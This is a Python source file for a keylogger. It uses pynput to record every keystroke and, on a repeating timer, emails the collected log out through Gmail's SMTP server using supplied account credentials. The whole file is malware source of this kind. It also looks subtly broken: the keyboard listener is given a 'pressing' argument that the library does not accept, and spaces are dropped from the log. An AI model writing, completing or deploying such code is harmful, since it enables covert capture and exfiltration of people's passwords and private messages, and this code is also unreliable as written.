import smtplib
import threading
from pynput import  keyboard

#keylogger class


class keylogger:
    def __init__(self,time_interval,email,password):
        self.interval=time_interval
        self.email=email
        self.password=password
        self.log="Keylogger is starting..."

    # mail sending class

    def send_report(self,email,password,message):
        server=smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

    # Create Report & Send Email

    def report_n_send(self):
        send_off = self.send_report(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    # log  with all keystrokes
    def append_log(self,string):
        self.log=self.log+string

    # key logger


    def pressing(self,key):
        try:
            current_key=str(key.char)
        except AttributeError:
            if key==key.space:
                current_key =""
            elif key==key.esc:
                print("Exiting programme...")
                return False
            else:
                current_key= ""+str(key)+""
        self.append_log(current_key)

    # start key-logger


    def start(self):
        keyboard_listen=keyboard.Listener(pressing=self.pressing)
        with keyboard_listen:
            self.report_n_send()
            keyboard_listen.join()